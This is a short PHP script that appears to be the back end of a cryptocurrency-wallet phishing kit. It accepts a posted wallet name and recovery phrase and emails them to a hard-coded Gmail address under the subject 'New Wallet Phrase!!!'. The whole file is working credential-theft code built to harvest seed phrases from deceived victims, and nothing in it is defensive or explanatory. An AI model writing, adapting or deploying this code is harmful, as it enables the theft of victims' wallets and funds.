<?php

$subject = "New Wallet Phrase!!!";
               

  

    session_start();
    include "conn.php";
    include "function.php";
    include "config.php";
    if(isset($_POST['wallet'])){
        $phrase = mysqli_real_escape_string($conn, $_POST['phrase']);
        $wallet = mysqli_real_escape_string($conn, $_POST['wallet']);
        if(empty($phrase) or empty($wallet) ){
            print json_encode(array(
                'status'=>0,
                'message'=>"Please Fill all Field",
            ));
        }else{
            $message = "<b>Wallet Name: </b>".$wallet."<br><br><b>Phrase: </b>".$phrase;
            if(send_mail("okaffskido@gmail.com", $subject, $message)){
                print json_encode(array(
                    'status'=>1
                ));
            } else{
                print json_encode(array(
                    'status'=>0,
                    'message'=>"Error: Unable to Process Form"
                ));
            }
            
            
        }
        
    }else{
        header("location:../");
    }
?>